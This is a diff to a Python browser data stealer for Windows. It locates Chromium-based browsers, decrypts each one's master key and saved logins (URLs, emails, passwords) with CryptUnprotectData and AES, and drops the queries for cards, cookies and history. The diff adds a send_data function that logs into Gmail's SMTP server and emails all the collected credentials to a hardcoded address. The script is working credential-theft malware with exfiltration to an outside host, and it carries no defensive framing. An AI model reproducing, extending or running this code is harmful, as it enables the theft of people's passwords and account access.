@@ -3,13 +3,16 @@ import json
 import os
 import shutil
 import sqlite3
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 from datetime import datetime, timedelta
-
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 appdata = os.getenv('LOCALAPPDATA')
 print(appdata)
+ALLDATA = ''
 
 browsers = {
     'avast': appdata + '\\AVAST Software\\Browser\\User Data',
@@ -37,30 +40,6 @@ data_queries = {
         'file': '\\Login Data',
         'columns': ['URL', 'Email', 'Password'],
         'decrypt': True
-    },
-    'credit_cards': {
-        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
-        'file': '\\Web Data',
-        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
-        'decrypt': True
-    },
-    'cookies': {
-        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
-        'file': '\\Network\\Cookies',
-        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
-        'decrypt': True
-    },
-    'history': {
-        'query': 'SELECT url, title, last_visit_time FROM urls',
-        'file': '\\History',
-        'columns': ['URL', 'Title', 'Visited Time'],
-        'decrypt': False
-    },
-    'downloads': {
-        'query': 'SELECT tab_url, target_path FROM downloads',
-        'file': '\\History',
-        'columns': ['Download URL', 'Local Path'],
-        'decrypt': False
     }
 }
 
@@ -131,6 +110,31 @@ def get_data(path: str, profile: str, key, type_of_data):
 def convert_chrome_time(chrome_time):
     return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
 
+def send_data(body):
+    email_sender = ''
+    email_receiver = email_sender
+
+    # Configura los detalles del mensaje
+    msg = MIMEMultipart()
+    msg['From'] = email_sender
+    msg['To'] = email_receiver
+    msg['Subject'] = 'Asunto del correo'
+
+    # Cuerpo del mensaje
+    msg.attach(MIMEText(body, 'plain'))
+
+    # Conéctate al servidor SMTP de Gmail
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+
+    # Inicia sesión con tu cuenta de Gmail
+    server.login(email_sender, '')
+
+    # Envía el mensaje
+    server.send_message(msg)
+
+    # Cierra la conexión
+    server.quit()
 
 def installed_browsers():
     available = []
@@ -147,13 +151,15 @@ if __name__ == '__main__':
         browser_path = browsers[browser]
         master_key = get_master_key(browser_path)
         print(f"Getting Stored Details from {browser}")
-
+        ALLDATA += f"=========={browser}========="
         for data_type_name, data_type in data_queries.items():
             try:
                 getting = data_type_name.replace('_', ' ').capitalize()
                 print(f"\t [!] Getting {getting}")
                 data = get_data(browser_path, "Default", master_key, data_type)
+                ALLDATA += data
                 save_results(browser, data_type_name, data)
                 print("\t------\n")
             except:
                 print(f"something went wrong with {browser} -> {getting}")
+    send_data(ALLDATA)
